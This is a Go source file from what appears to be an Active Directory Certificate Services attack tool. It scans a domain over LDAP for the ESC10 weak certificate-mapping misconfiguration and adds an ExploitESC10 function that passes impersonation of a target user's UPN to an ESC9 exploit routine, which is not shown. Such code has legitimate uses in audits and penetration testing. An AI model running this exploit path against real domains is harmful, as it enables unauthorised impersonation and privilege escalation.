package pki

import (
	"context"
	"crypto"
	"crypto/x509"
	"fmt"
	"strings"

	"github.com/go-ldap/ldap/v3"
)

// Certificate mapping method flags from HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel
// and the domain-level CertificateMappingMethods attribute.
const (
	// certMapSubject maps certificates based on subject/issuer (1:1 mapping).
	certMapSubject uint32 = 0x01
	// certMapIssuer maps certificates based on issuer only.
	certMapIssuer uint32 = 0x02
	// certMapUPN maps certificates based on the UPN in the SAN — weak, exploitable.
	certMapUPN uint32 = 0x04
	// certMapS4U2Self maps certificates using S4U2Self Kerberos extension — weak, exploitable.
	certMapS4U2Self uint32 = 0x08
	// certMapS4U2Proxy maps certificates using S4U2Proxy.
	certMapS4U2Proxy uint32 = 0x10
	// certMapPrePatchDefault is the default value before KB5014754 (all methods enabled).
	certMapPrePatchDefault uint32 = 0x1F
)

// ESC10Finding represents a domain configuration vulnerable to ESC10
// (weak certificate mapping methods allowing UPN-based or S4U2Self-based impersonation).
type ESC10Finding struct {
	MappingMethods      uint32   `json:"mapping_methods"`
	UPNMappingEnabled   bool     `json:"upn_mapping_enabled"`
	S4U2SelfEnabled     bool     `json:"s4u2self_enabled"`
	BindingEnforcement  int      `json:"binding_enforcement"`
	VulnerableTemplates []string `json:"vulnerable_templates"`
}

// CheckCertificateMapping queries LDAP for CertificateMappingMethods on the domain root.
// This attribute controls how the DC maps certificates to accounts during authentication.
//
// Return values:
//
//	Actual bitmask if found in LDAP
//	0x1F (pre-patch default) if the attribute is not present (with warning)
//	0 on error
func CheckCertificateMapping(ctx context.Context, cfg *ADCSConfig, conn *ldap.Conn) (uint32, error) {

	domainDN := buildDomainDN(cfg.Domain)
	fmt.Printf("[*] Checking CertificateMappingMethods on %s\n", domainDN)

	searchReq := ldap.NewSearchRequest(
		domainDN, ldap.ScopeBaseObject, ldap.NeverDerefAliases,
		0, 0, false,
		"(objectClass=*)",
		[]string{"CertificateMappingMethods"},
		nil,
	)

	result, err := conn.Search(searchReq)
	if err != nil {
		return 0, fmt.Errorf("LDAP search for CertificateMappingMethods: %w", err)
	}

	if len(result.Entries) == 0 {
		fmt.Println("[!] Domain root object not found — cannot determine certificate mapping methods")
		return 0, fmt.Errorf("domain root object not found")
	}

	val := result.Entries[0].GetAttributeValue("CertificateMappingMethods")
	if val == "" {
		// Attribute not present — pre-KB5014754 default is 0x1F (all methods enabled)
		fmt.Printf("[!] CertificateMappingMethods not set — assuming pre-patch default (0x%02x, all methods enabled)\n",
			certMapPrePatchDefault)
		return certMapPrePatchDefault, nil
	}

	var methods uint32
	if _, err := fmt.Sscanf(val, "%d", &methods); err != nil {
		return 0, fmt.Errorf("parse CertificateMappingMethods value %q: %w", val, err)
	}

	fmt.Printf("[+] CertificateMappingMethods = 0x%02x\n", methods)
	if methods&certMapUPN != 0 {
		fmt.Println("[!]   UPN mapping enabled (0x04) — WEAK")
	}
	if methods&certMapS4U2Self != 0 {
		fmt.Println("[!]   S4U2Self mapping enabled (0x08) — WEAK")
	}

	return methods, nil
}

// ScanESC10 identifies ESC10 vulnerabilities by checking for weak certificate mapping
// methods (UPN or S4U2Self) combined with templates that have authentication EKUs.
//
// ESC10 is exploitable when:
//   - CertificateMappingMethods includes UPN (0x04) or S4U2Self (0x08)
//   - StrongCertificateBindingEnforcement < 2 (not full enforcement)
//   - Templates exist with authentication EKUs
//
// Unlike ESC9, ESC10 does not require CT_FLAG_NO_SECURITY_EXTENSION — the weak
// mapping methods themselves are the vulnerability.
func ScanESC10(ctx context.Context, cfg *ADCSConfig, conn *ldap.Conn) ([]ESC10Finding, error) {
	fmt.Println("[*] Scanning for ESC10 (weak certificate mapping methods)...")

	// Check certificate mapping methods
	methods, err := CheckCertificateMapping(ctx, cfg, conn)
	if err != nil {
		return nil, fmt.Errorf("check certificate mapping: %w", err)
	}

	upnEnabled := methods&certMapUPN != 0
	s4u2selfEnabled := methods&certMapS4U2Self != 0

	if !upnEnabled && !s4u2selfEnabled {
		fmt.Println("[+] ESC10: Neither UPN nor S4U2Self mapping enabled — not vulnerable")
		return nil, nil
	}

	// Check strong certificate binding enforcement (reuse ESC9's check)
	enforcement, err := CheckESC9Registry(cfg)
	if err != nil {
		fmt.Printf("[!] Could not determine binding enforcement: %v\n", err)
		fmt.Println("[*] Continuing scan — findings will note unknown enforcement")
	}

	if enforcement == 2 {
		fmt.Println("[*] Full binding enforcement enabled — ESC10 mitigated, but flagging for completeness")
	}

	// Find templates with authentication EKUs
	templates, err := EnumerateTemplates(ctx, cfg, conn)
	if err != nil {
		return nil, fmt.Errorf("enumerate templates: %w", err)
	}

	var vulnTemplates []string
	for _, tmpl := range templates {
		if tmpl.AuthenticationEKU && !tmpl.RequiresManagerApproval {
			vulnTemplates = append(vulnTemplates, tmpl.Name)
		}
	}

	if len(vulnTemplates) == 0 {
		fmt.Println("[+] ESC10: No templates with authentication EKU found (without manager approval)")
		return nil, nil
	}

	finding := ESC10Finding{
		MappingMethods:      methods,
		UPNMappingEnabled:   upnEnabled,
		S4U2SelfEnabled:     s4u2selfEnabled,
		BindingEnforcement:  enforcement,
		VulnerableTemplates: vulnTemplates,
	}

	status := "EXPLOITABLE"
	if enforcement == 2 {
		status = "mitigated (full enforcement)"
	} else if enforcement == -1 {
		status = "exploitable (enforcement unknown — assume vulnerable)"
	}

	fmt.Printf("[!] ESC10: Weak certificate mapping detected [%s]\n", status)
	if upnEnabled {
		fmt.Printf("[!]   UPN mapping (0x04): attacker can map certs via UPN SAN\n")
	}
	if s4u2selfEnabled {
		fmt.Printf("[!]   S4U2Self mapping (0x08): attacker can use S4U2Self with cert\n")
	}
	fmt.Printf("[!]   %d template(s) with authentication EKU: %s\n",
		len(vulnTemplates), strings.Join(vulnTemplates, ", "))

	return []ESC10Finding{finding}, nil
}

// ExploitESC10 automates the ESC10 attack. Since ESC10 relies on weak domain mapping,
// the actual exploitation path is identical to ESC9: modifying the UPN on an attacker
// object, requesting a certificate, and restoring the UPN.
// This function verifies the domain is vulnerable to ESC10, then delegates to ExploitESC9.
func ExploitESC10(ctx context.Context, cfg *ADCSConfig, conn *ldap.Conn, templateName, attackerDN, targetUPN string) (*x509.Certificate, crypto.Signer, error) {
	fmt.Printf("[!] ESC10 Exploitation: template=%s attackerDN=%s targetUPN=%s\n", templateName, attackerDN, targetUPN)

	// Step 1: Verify ESC10 vulnerability
	findings, err := ScanESC10(ctx, cfg, conn)
	if err != nil {
		return nil, nil, fmt.Errorf("ESC10 scan: %w", err)
	}
	if len(findings) == 0 {
		return nil, nil, fmt.Errorf("domain is not vulnerable to ESC10 (weak certificate mapping)")
	}

	fmt.Printf("[+] Domain confirmed vulnerable to ESC10. Exploiting via UPN modification (ESC9 methodology)...\n")

	// Step 2: Delegate to ExploitESC9
	return ExploitESC9(ctx, cfg, conn, templateName, attackerDN, targetUPN)
}
